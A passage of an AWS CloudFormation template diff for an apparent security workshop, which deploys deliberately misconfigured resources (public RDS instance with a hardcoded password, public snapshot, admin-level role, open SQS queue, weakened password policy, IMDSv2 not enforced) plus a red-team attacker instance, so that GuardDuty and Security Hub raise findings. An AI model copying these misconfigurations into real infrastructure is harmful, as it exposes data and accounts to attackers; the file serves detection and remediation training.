+          Value: !Sub "${EnvironmentName}-vulnerable-ssh"
+        - Key: Purpose
+          Value: SSH-BruteForce-Target
+
+  # ============================================
+  # GUARDDUTY THREAT INTEL
+  # ============================================
+  
+  RDSThreatIntelLambdaRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
+      Policies:
+        - PolicyName: GuardDutyS3Access
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Effect: Allow
+                Action:
+                  - guardduty:ListDetectors
+                  - guardduty:CreateThreatIntelSet
+                  - guardduty:UpdateThreatIntelSet
+                  - guardduty:GetThreatIntelSet
+                  - guardduty:ListThreatIntelSets
+                  - guardduty:DeleteThreatIntelSet
+                Resource: !Sub "arn:aws:guardduty:${AWS::Region}:${AWS::AccountId}:detector/*"
+              - Effect: Allow
+                Action:
+                  - s3:CreateBucket
+                  - s3:DeleteBucket
+                  - s3:PutObject
+                  - s3:GetObject
+                  - s3:DeleteObject
+                  - s3:DeleteObjects
+                  - s3:ListBucket
+                  - s3:HeadBucket
+                Resource:
+                  - !Sub "arn:aws:s3:::guardduty-threat-${AWS::AccountId}-${AWS::Region}-*"
+                  - !Sub "arn:aws:s3:::guardduty-threat-${AWS::AccountId}-${AWS::Region}-*/*"
+              - Effect: Allow
+                Action:
+                  - sts:GetCallerIdentity
+                Resource: "*"
+
+  RDSThreatIntelLambda:
+    Type: AWS::Lambda::Function
+    Properties:
+      FunctionName: !Sub "${EnvironmentName}-rds-threat-intel"
+      Runtime: python3.12
+      Handler: index.handler
+      Role: !GetAtt RDSThreatIntelLambdaRole.Arn
+      Timeout: 60
+      Environment:
+        Variables:
+          RED_TEAM_IP: !GetAtt AttackerInstance.PublicIp
+      Code:
+        ZipFile: |
+          import boto3
+          import cfnresponse
+          import os
+          import hashlib
+
+          def handler(event, context):
+            try:
+              guardduty = boto3.client('guardduty')
+              s3 = boto3.client('s3')
+              sts = boto3.client('sts')
+
+              stack_id = event.get('StackId', '')
+              account_id = sts.get_caller_identity()['Account']
+              region = boto3.Session().region_name
+              stack_name = stack_id.split('/')[-2] if stack_id else 'unknown'
+              unique_hash = hashlib.md5(f"{stack_id}-{account_id}".encode()).hexdigest()[:8]
+              bucket = f"guardduty-threat-{account_id}-{region}-{unique_hash}".lower()
+
+              if event['RequestType'] == 'Delete':
+                try:
+                  # Delete threat intel set first
+                  detectors = guardduty.list_detectors()
+                  if detectors['DetectorIds']:
+                    detector_id = detectors['DetectorIds'][0]
+                    threat_sets = guardduty.list_threat_intel_sets(DetectorId=detector_id)
+                    for tid in threat_sets.get('ThreatIntelSetIds', []):
+                      try:
+                        tset = guardduty.get_threat_intel_set(DetectorId=detector_id, ThreatIntelSetId=tid)
+                        if stack_name in tset.get('Name', ''):
+                          guardduty.delete_threat_intel_set(DetectorId=detector_id, ThreatIntelSetId=tid)
+                          print(f"Deleted threat intel set: {tid}")
+                      except Exception as e:
+                        print(f"Could not delete threat intel set: {e}")
+                  
+                  # Delete S3 bucket
+                  objects = s3.list_objects_v2(Bucket=bucket)
+                  if 'Contents' in objects:
+                    delete_keys = [{'Key': obj['Key']} for obj in objects['Contents']]
+                    s3.delete_objects(Bucket=bucket, Delete={'Objects': delete_keys})
+                  s3.delete_bucket(Bucket=bucket)
+                  print(f"Deleted bucket: {bucket}")
+                except Exception as e:
+                  print(f"Cleanup error: {str(e)}")
+                cfnresponse.send(event, context, cfnresponse.SUCCESS, {})
+                return
+
+              red_team_ip = os.environ['RED_TEAM_IP']
+              threat_content = f"{red_team_ip}\n"
+
+              try:
+                s3.head_bucket(Bucket=bucket)
+              except:
+                create_bucket_config = {}
+                if region != 'us-east-1':
+                  create_bucket_config = {'CreateBucketConfiguration': {'LocationConstraint': region}}
+                s3.create_bucket(Bucket=bucket, **create_bucket_config)
+
+              key = 'rds-threat-ips.txt'
+              s3.put_object(Bucket=bucket, Key=key, Body=threat_content)
+
+              detectors = guardduty.list_detectors()
+              if not detectors['DetectorIds']:
+                raise Exception('No GuardDuty detector found')
+
+              detector_id = detectors['DetectorIds'][0]
+              response = guardduty.create_threat_intel_set(
+                DetectorId=detector_id,
+                Name=f'RDS-Attacker-IPs-{stack_name}',
+                Format='TXT',
+                Location=f's3://{bucket}/{key}',
+                Activate=True
+              )
+
+              cfnresponse.send(event, context, cfnresponse.SUCCESS, {
+                'BucketName': bucket,
+                'ThreatIntelSetId': response['ThreatIntelSetId'],
+                'RedTeamIP': red_team_ip
+              })
+            except Exception as e:
+              print(f"Error: {str(e)}")
+              cfnresponse.send(event, context, cfnresponse.FAILED, {})
+
+  RDSThreatIntelSetup:
+    Type: Custom::RDSThreatIntel
+    Properties:
+      ServiceToken: !GetAtt RDSThreatIntelLambda.Arn
+    DependsOn: AttackerInstance
+
+
+  # ============================================
+  # MODULE 2: JIT RDS ACCESS - AURORA MYSQL
+  # ============================================
+  
+  Module5JITVPC:
+    Type: AWS::EC2::VPC
+    Properties:
+      CidrBlock: 10.1.0.0/16
+      EnableDnsHostnames: true
+      EnableDnsSupport: true
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-vpc"
+
+  Module5JITInternetGateway:
+    Type: AWS::EC2::InternetGateway
+    Properties:
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-igw"
+
+  Module5JITGatewayAttachment:
+    Type: AWS::EC2::VPCGatewayAttachment
+    Properties:
+      VpcId: !Ref Module5JITVPC
+      InternetGatewayId: !Ref Module5JITInternetGateway
+
+  Module5JITPublicSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref Module5JITVPC
+      CidrBlock: 10.1.0.0/24
+      AvailabilityZone: !Select [0, !GetAZs '']
+      MapPublicIpOnLaunch: true
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-public-subnet"
+
+  Module5JITPrivateSubnet1:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref Module5JITVPC
+      CidrBlock: 10.1.1.0/24
+      AvailabilityZone: !Select [0, !GetAZs '']
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-subnet-1"
+
+  Module5JITPrivateSubnet2:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref Module5JITVPC
+      CidrBlock: 10.1.2.0/24
+      AvailabilityZone: !Select [1, !GetAZs '']
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-subnet-2"
+
+  Module5JITEIP:
+    Type: AWS::EC2::EIP
+    DependsOn: Module5JITGatewayAttachment
+    Properties:
+      Domain: vpc
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-nat-eip"
+
+  Module5JITNATGateway:
+    Type: AWS::EC2::NatGateway
+    Properties:
+      AllocationId: !GetAtt Module5JITEIP.AllocationId
+      SubnetId: !Ref Module5JITPublicSubnet
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-nat-gateway"
+
+  Module5JITPublicRouteTable:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref Module5JITVPC
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-public-rt"
+
+  Module5JITPublicRoute:
+    Type: AWS::EC2::Route
+    DependsOn: Module5JITGatewayAttachment
+    Properties:
+      RouteTableId: !Ref Module5JITPublicRouteTable
+      DestinationCidrBlock: 0.0.0.0/0
+      GatewayId: !Ref Module5JITInternetGateway
+
+  Module5JITPublicSubnetRouteTableAssociation:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      SubnetId: !Ref Module5JITPublicSubnet
+      RouteTableId: !Ref Module5JITPublicRouteTable
+
+  Module5JITPrivateRouteTable:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref Module5JITVPC
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-private-rt"
+
+  Module5JITPrivateRoute:
+    Type: AWS::EC2::Route
+    Properties:
+      RouteTableId: !Ref Module5JITPrivateRouteTable
+      DestinationCidrBlock: 0.0.0.0/0
+      NatGatewayId: !Ref Module5JITNATGateway
+
+  Module5JITPrivateSubnet1RouteTableAssociation:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      SubnetId: !Ref Module5JITPrivateSubnet1
+      RouteTableId: !Ref Module5JITPrivateRouteTable
+
+  Module5JITPrivateSubnet2RouteTableAssociation:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      SubnetId: !Ref Module5JITPrivateSubnet2
+      RouteTableId: !Ref Module5JITPrivateRouteTable
+
+  Module5JITSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: Security group for JIT RDS access
+      VpcId: !Ref Module5JITVPC
+      SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 3306
+          ToPort: 3306
+          CidrIp: 0.0.0.0/0
+          Description: MySQL access for workshop
+      SecurityGroupEgress:
+        - IpProtocol: -1
+          CidrIp: 0.0.0.0/0
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-rds-sg"
+
+  Module5JITDBSubnetGroup:
+    Type: AWS::RDS::DBSubnetGroup
+    Properties:
+      DBSubnetGroupName: !Sub "${EnvironmentName}-jit-db-subnet-group"
+      DBSubnetGroupDescription: Subnet group for JIT RDS cluster
+      SubnetIds:
+        - !Ref Module5JITPrivateSubnet1
+        - !Ref Module5JITPrivateSubnet2
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-db-subnet-group"
+
+  Module5JITDBClusterParameterGroup:
+    Type: AWS::RDS::DBClusterParameterGroup
+    Properties:
+      Description: Aurora MySQL cluster parameter group with audit logging
+      Family: aurora-mysql8.0
+      Parameters:
+        server_audit_logging: 1
+        server_audit_events: CONNECT,QUERY,QUERY_DDL,QUERY_DML
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-cluster-params"
+
+  Module5JITAuditLogGroup:
+    Type: AWS::Logs::LogGroup
+    Properties:
+      LogGroupName: !Sub "/aws/rds/cluster/${EnvironmentName}-jit-rds-cluster/audit"
+      RetentionInDays: 7
+
+  Module5JITRDSCluster:
+    Type: AWS::RDS::DBCluster
+    DeletionPolicy: Delete
+    Properties:
+      DBClusterIdentifier: !Sub "${EnvironmentName}-jit-rds-cluster"
+      Engine: aurora-mysql
+      EngineVersion: "8.0.mysql_aurora.3.10.2"
+      DatabaseName: workshop_db
+      MasterUsername: admin
+      ManageMasterUserPassword: true
+      DBSubnetGroupName: !Ref Module5JITDBSubnetGroup
+      VpcSecurityGroupIds:
+        - !Ref Module5JITSecurityGroup
+      DBClusterParameterGroupName: !Ref Module5JITDBClusterParameterGroup
+      EnableIAMDatabaseAuthentication: true
+      EnableHttpEndpoint: true
+      ServerlessV2ScalingConfiguration:
+        MinCapacity: 0.5
+        MaxCapacity: 2
+      EnableCloudwatchLogsExports:
+        - audit
+      BackupRetentionPeriod: 1
+      PreferredBackupWindow: "03:00-04:00"
+      PreferredMaintenanceWindow: "mon:04:00-mon:05:00"
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-rds-cluster"
+        - Key: Module
+          Value: Module2-JIT
+
+  Module5JITRDSInstance:
+    Type: AWS::RDS::DBInstance
+    DeletionPolicy: Delete
+    Properties:
+      DBInstanceIdentifier: !Sub "${EnvironmentName}-jit-rds-writer"
+      DBClusterIdentifier: !Ref Module5JITRDSCluster
+      DBInstanceClass: db.serverless
+      Engine: aurora-mysql
+      PubliclyAccessible: false
+      MonitoringInterval: 60
+      MonitoringRoleArn: !GetAtt RDSEnhancedMonitoringRole.Arn
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-jit-rds-writer"
+        - Key: Module
+          Value: Module2-JIT
+
+  # ============================================
+  # MODULE 4: SECURITY HUB VULNERABLE RESOURCES
+  # ============================================
+  
+  # EC2.2 - Default Security Group (Vulnerable)
+  Module5DefaultSGIngressVulnerable:
+    Type: AWS::EC2::SecurityGroupIngress
+    Properties:
+      GroupId: !GetAtt VPC.DefaultSecurityGroup
+      IpProtocol: -1
+      CidrIp: 0.0.0.0/0
+      Description: "VULNERABLE - Allows all traffic from anywhere"
+
+  # EC2.8 - EC2 Instance without IMDSv2
+  Module5VulnerableEC2:
+    Type: AWS::EC2::Instance
+    Properties:
+      InstanceType: t3.micro
+      ImageId: !Ref LatestAmiId
+      IamInstanceProfile: !Ref GeneralInstanceProfile
+      NetworkInterfaces:
+        - AssociatePublicIpAddress: true
+          DeviceIndex: '0'
+          GroupSet:
+            - !Ref GeneralSecurityGroup
+          SubnetId: !Ref Subnet1
+      MetadataOptions:
+        HttpEndpoint: enabled
+        HttpTokens: optional  # VULNERABLE - Should be 'required'
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-vulnerable-ec2"
+        - Key: Vulnerability
+          Value: EC2.8-IMDSv2-Not-Enforced
+
+  # EC2.15 - Subnet with Auto-assign Public IP
+  Module5VulnerableSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref VPC
+      CidrBlock: 10.0.10.0/24
+      AvailabilityZone: !Select [0, !GetAZs '']
+      MapPublicIpOnLaunch: true  # VULNERABLE
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-vulnerable-subnet"
+        - Key: Vulnerability
+          Value: EC2.15-Auto-Assign-Public-IP
+
+  Module5SubnetRouteAssoc:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref RouteTable
+      SubnetId: !Ref Module5VulnerableSubnet
+
+  # S3 Bucket with Public Access Block disabled (for Security Hub S3.1 finding)
+  # NOTE: If your account has account-level S3 Block Public Access enabled,
+  # this bucket will still be created but won't be publicly accessible.
+  # The Security Hub finding will still be generated for the bucket configuration.
+  Module5PublicS3Bucket:
+    Type: AWS::S3::Bucket
+    Metadata:
+      checkov:
+        skip:
+          - id: "CKV_AWS_18"
+            comment: "Module 5 intentionally-public S3 bucket used to teach detection/remediation of public buckets; access logging deliberately omitted for the lesson."
+          - id: "CKV_AWS_53"
+            comment: "Public access is the intentional vulnerability demonstrated in Module 5 (BlockPublicAcls disabled on purpose)."
+          - id: "CKV_AWS_54"
+            comment: "Public access is the intentional vulnerability demonstrated in Module 5 (BlockPublicPolicy disabled on purpose)."
+          - id: "CKV_AWS_55"
+            comment: "Public access is the intentional vulnerability demonstrated in Module 5 (IgnorePublicAcls disabled on purpose)."
+          - id: "CKV_AWS_56"
+            comment: "Public access is the intentional vulnerability demonstrated in Module 5 (RestrictPublicBuckets disabled on purpose)."
+    Properties:
+      BucketName: !Sub "${EnvironmentName}-public-${AWS::AccountId}"
+      PublicAccessBlockConfiguration:
+        BlockPublicAcls: false
+        BlockPublicPolicy: false
+        IgnorePublicAcls: false
+        RestrictPublicBuckets: false
+      Tags:
+        - Key: Vulnerability
+          Value: S3-Public-Access
+
+  # NOTE: This policy may fail if account-level S3 Block Public Access is enabled.
+  # The stack will continue without this resource - Security Hub will still detect
+  # the misconfigured PublicAccessBlockConfiguration on the bucket.
+  # Module5PublicBucketPolicy:
+  #   Type: AWS::S3::BucketPolicy
+  #   Properties:
+  #     Bucket: !Ref Module5PublicS3Bucket
+  #     PolicyDocument:
+  #       Statement:
+  #         - Sid: PublicReadGetObject
+  #           Effect: Allow
+  #           Principal: '*'
+  #           Action:
+  #             - s3:GetObject
+  #             - s3:ListBucket
+  #           Resource:
+  #             - !Sub '${Module5PublicS3Bucket.Arn}/*'
+  #             - !GetAtt Module5PublicS3Bucket.Arn
+
+  # Public RDS Instance
+  Module5VulnerableRDS:
+    Type: AWS::RDS::DBInstance
+    Metadata:
+      checkov:
+        skip:
+          - id: "CKV_AWS_17"
+            comment: "Intentionally public RDS instance; public accessibility is the vulnerability participants detect and remediate in Module 5."
+          - id: "CKV_AWS_161"
+            comment: "IAM database authentication intentionally omitted on this deliberately-vulnerable Module 5 teaching resource."
+    DependsOn:
+      - RDSPublicRoute
+      - RDSSubnet1RouteTableAssociation
+      - RDSSubnet2RouteTableAssociation
+    DeletionPolicy: Delete
+    Properties:
+      DBInstanceIdentifier: !Sub "${EnvironmentName}-vulnerable-rds"
+      DBInstanceClass: db.t3.micro
+      Engine: mysql
+      # EngineVersion intentionally omitted: RDS uses the region's current default MySQL version,
+      # so the stack does not break when AWS retires a specific minor version.
+      MasterUsername: admin
+      MasterUserPassword: Module5Pass123!
+      AllocatedStorage: 20
+      DBSubnetGroupName: !Ref RDSDBSubnetGroup
+      VPCSecurityGroups:
+        - !Ref RDSSecurityGroup
+      PubliclyAccessible: true  # VULNERABLE
+      StorageEncrypted: false  # VULNERABLE
+      BackupRetentionPeriod: 0
+      DeletionProtection: false  # VULNERABLE
+      Tags:
+        - Key: Vulnerability
+          Value: RDS-Public
+
+  # Unencrypted SQS Queue
+  Module5UnencryptedSQS:
+    Type: AWS::SQS::Queue
+    Properties:
+      QueueName: !Sub "${EnvironmentName}-unencrypted-queue"
+      Tags:
+        - Key: Vulnerability
+          Value: SQS-Unencrypted
+
+  Module5SQSPolicy:
+    Type: AWS::SQS::QueuePolicy
+    Properties:
+      Queues:
+        - !Ref Module5UnencryptedSQS
+      PolicyDocument:
+        Statement:
+          - Effect: Allow
+            Principal: '*'
+            Action: sqs:*
+            Resource: !GetAtt Module5UnencryptedSQS.Arn
+
+  # DynamoDB without Protection
+  Module5VulnerableDynamoDB:
+    Type: AWS::DynamoDB::Table
+    DeletionPolicy: Delete
+    Properties:
+      TableName: !Sub "${EnvironmentName}-vulnerable-table"
+      AttributeDefinitions:
+        - AttributeName: id
+          AttributeType: S
+      KeySchema:
+        - AttributeName: id
+          KeyType: HASH
+      BillingMode: PAY_PER_REQUEST
+      DeletionProtectionEnabled: false  # VULNERABLE
+      PointInTimeRecoverySpecification:
+        PointInTimeRecoveryEnabled: false  # VULNERABLE
+      Tags:
+        - Key: Vulnerability
+          Value: DynamoDB-No-Protection
+
+  # IAM Over-Privileged Role (for Security Hub IAM findings)
+  Module5OverPrivilegedRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub "${EnvironmentName}-overprivileged-role"
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: ec2.amazonaws.com
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/AdministratorAccess  # VULNERABLE
+      Tags:
+        - Key: Vulnerability
+          Value: IAM-Over-Privileged
+
+  # IAM Over-Privileged User (for Security Hub IAM findings)
+  Module5OverPrivilegedUser:
+    Type: AWS::IAM::User
+    Properties:
+      UserName: !Sub "${EnvironmentName}-overprivileged-user"
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/PowerUserAccess  # VULNERABLE
+      Tags:
+        - Key: Vulnerability
+          Value: IAM-Over-Privileged
+
+  # Public RDS Snapshot Lambda
+  Module5CreateRDSSnapshotRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/AmazonRDSFullAccess
+        - arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
+
+  Module5CreateRDSSnapshot:
+    Type: AWS::Lambda::Function
+    Properties:
+      FunctionName: !Sub "${EnvironmentName}-create-snapshot"
+      Runtime: python3.12
+      Handler: index.handler
+      Role: !GetAtt Module5CreateRDSSnapshotRole.Arn
+      Timeout: 300
+      Code:
+        ZipFile: |
+          import boto3
+          import cfnresponse
+          
+          def handler(event, context):
+              rds = boto3.client('rds')
+              db_instance = event['ResourceProperties']['DBInstanceId']
+              snapshot_id = f"{db_instance}-public-snapshot"
+              
+              if event['RequestType'] == 'Delete':
+                  # Clean up the snapshot on stack deletion
+                  try:
+                      rds.delete_db_snapshot(DBSnapshotIdentifier=snapshot_id)
+                      print(f"Deleted snapshot: {snapshot_id}")
+                  except Exception as e:
+                      print(f"Could not delete snapshot (may not exist): {str(e)}")
+                  cfnresponse.send(event, context, cfnresponse.SUCCESS, {})
+                  return
+              
+              try:
+                  rds.create_db_snapshot(
+                      DBSnapshotIdentifier=snapshot_id,
+                      DBInstanceIdentifier=db_instance
+                  )
+                  
+                  waiter = rds.get_waiter('db_snapshot_completed')
+                  waiter.wait(
+                      DBSnapshotIdentifier=snapshot_id,
+                      WaiterConfig={'Delay': 30, 'MaxAttempts': 120}
+                  )
+                  
+                  # Make it public (VULNERABLE)
+                  rds.modify_db_snapshot_attribute(
+                      DBSnapshotIdentifier=snapshot_id,
+                      AttributeName='restore',
+                      ValuesToAdd=['all']
+                  )
+                  
+                  cfnresponse.send(event, context, cfnresponse.SUCCESS, {'SnapshotId': snapshot_id})
+              except Exception as e:
+                  print(str(e))
+                  cfnresponse.send(event, context, cfnresponse.SUCCESS, {})
+
+  Module5InvokeSnapshot:
+    Type: Custom::CreateSnapshot
+    DependsOn: Module5VulnerableRDS
+    Properties:
+      ServiceToken: !GetAtt Module5CreateRDSSnapshot.Arn
+      DBInstanceId: !Ref Module5VulnerableRDS
+
+  # Weak IAM Password Policy
+  Module5WeakPasswordPolicyRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/IAMFullAccess
+
+  Module5SetWeakPasswordPolicy:
+    Type: AWS::Lambda::Function
+    Properties:
+      FunctionName: !Sub "${EnvironmentName}-weak-password"
+      Runtime: python3.12
+      Handler: index.handler
+      Role: !GetAtt Module5WeakPasswordPolicyRole.Arn
+      Code:
+        ZipFile: |
+          import boto3
+          import cfnresponse
+          
+          def handler(event, context):
+              if event['RequestType'] == 'Delete':
+                  cfnresponse.send(event, context, cfnresponse.SUCCESS, {})
+                  return
+              
+              iam = boto3.client('iam')
+              try:
+                  iam.update_account_password_policy(
+                      MinimumPasswordLength=6,
+                      RequireSymbols=False,
+                      RequireNumbers=False,
+                      RequireUppercaseCharacters=False,
+                      RequireLowercaseCharacters=False
+                  )
+                  cfnresponse.send(event, context, cfnresponse.SUCCESS, {})
+              except Exception as e:
+                  cfnresponse.send(event, context, cfnresponse.FAILED, {'Error': str(e)})
+
+  Module5InvokePasswordPolicy:
+    Type: Custom::PasswordPolicy
+    Properties:
+      ServiceToken: !GetAtt Module5SetWeakPasswordPolicy.Arn
+
+# ============================================
+# OUTPUTS
+# ============================================
+
+Outputs:
+  # General
+  StackName:
+    Description: Stack Name
+    Value: !Ref AWS::StackName
+
+  Region:
+    Description: AWS Region
+    Value: !Ref AWS::Region
+
+  # Networking
+  MainVPCId:
+    Description: Main VPC ID
+    Value: !Ref VPC
+    Export:
+      Name: !Sub "${EnvironmentName}-main-vpc-id"
+
+  RDSVPCId:
+    Description: RDS VPC ID
+    Value: !Ref RDSVPC
+    Export:
+      Name: !Sub "${EnvironmentName}-rds-vpc-id"
+
+  # Attack Simulation
+  RedTeamAttackerIP:
+    Description: Red Team Attacker Public IP (generates GuardDuty findings)
+    Value: !GetAtt AttackerInstance.PublicIp
+
+  VulnerableSSHIP:
+    Description: Vulnerable SSH Instance Private IP
+    Value: !GetAtt VulnerableSSHInstance.PrivateIp
+
+  # Module 2 - JIT RDS Access
+  JITVpcId:
+    Description: VPC ID for JIT RDS Access
+    Value: !Ref Module5JITVPC
+    Export:
+      Name: !Sub "${EnvironmentName}-jit-vpc-id"
+
+  JITDBClusterEndpoint:
+    Description: Aurora MySQL Cluster Writer Endpoint (for Module 2)
+    Value: !GetAtt Module5JITRDSCluster.Endpoint.Address
+    Export:
+      Name: !Sub "${EnvironmentName}-jit-cluster-endpoint"
+
+  JITDBClusterReadEndpoint:
+    Description: Aurora MySQL Cluster Reader Endpoint
+    Value: !GetAtt Module5JITRDSCluster.ReadEndpoint.Address
+
+  JITDatabaseName:
+    Description: Database Name for JIT Access
+    Value: workshop_db
+
+  JITAuditLogGroupName:
+    Description: CloudWatch Log Group for Audit Logs
+    Value: !Ref Module5JITAuditLogGroup
+
+  # Module 4 - Security Hub Vulnerable Resources
+  VulnerableEC2Instance:
+    Description: Vulnerable EC2 Instance (IMDSv2 not enforced)
+    Value: !Ref Module5VulnerableEC2
+
+  PublicS3Bucket:
+    Description: Public S3 Bucket (for Security Hub findings)
+    Value: !Ref Module5PublicS3Bucket
+
+  VulnerableRDSInstance:
+    Description: Vulnerable RDS Instance (publicly accessible)
+    Value: !Ref Module5VulnerableRDS
+
+  UnencryptedSQSQueue:
+    Description: Unencrypted SQS Queue
+    Value: !Ref Module5UnencryptedSQS
+
+  # PostgreSQL (for GuardDuty RDS findings)
+  PostgreSQLEndpoint:
+    Description: PostgreSQL Endpoint (for GuardDuty RDS findings)
+    Value: !GetAtt PostgreSQLDatabase.Endpoint.Address
+
+  PostgreSQLSecretArn:
+    Description: PostgreSQL Secret ARN
+    Value: !Ref PostgreSQLSecret
+
+  # Cleanup Instructions
+  CleanupInstructions:
+    Description: To delete all resources, delete this CloudFormation stack
+    Value: !Sub "aws cloudformation delete-stack --stack-name ${AWS::StackName} --region ${AWS::Region}"
+
+  GuardDutySNSTopicArn:
+    Description: GuardDuty SNS Topic ARN for notifications
+    Value: !Ref GuardDutySNSTopic
+    Export:
+      Name: !Sub "${EnvironmentName}-guardduty-sns-topic"
+
+  GuardDutyLogBucket:
+    Description: S3 bucket for GuardDuty logs
+    Value: !Ref GDLogBucket
+  # New AWS Security Hub (V2)
+  SecurityHubV2Arn:
+    Description: ARN of the new AWS Security Hub (HubV2) resource
+    Value: !Ref SecurityHubV2Enable
+  SecurityHubV2SubscribedAt:
+    Description: Timestamp when the new AWS Security Hub was enabled in this account
+    Value: !GetAtt SecurityHubV2Enable.SubscribedAt
+  SecurityHubV2ConsoleUrl:
+    Description: Console URL for the new AWS Security Hub unified experience
+    Value: !Sub "https://${AWS::Region}.console.aws.amazon.com/securityhub/v2/home?region=${AWS::Region}"
+  SecurityHubCspmConsoleUrl:
+    Description: Console URL for Security Hub CSPM (posture management, used in Module 5)
+    Value: !Sub "https://${AWS::Region}.console.aws.amazon.com/securityhub/home?region=${AWS::Region}"
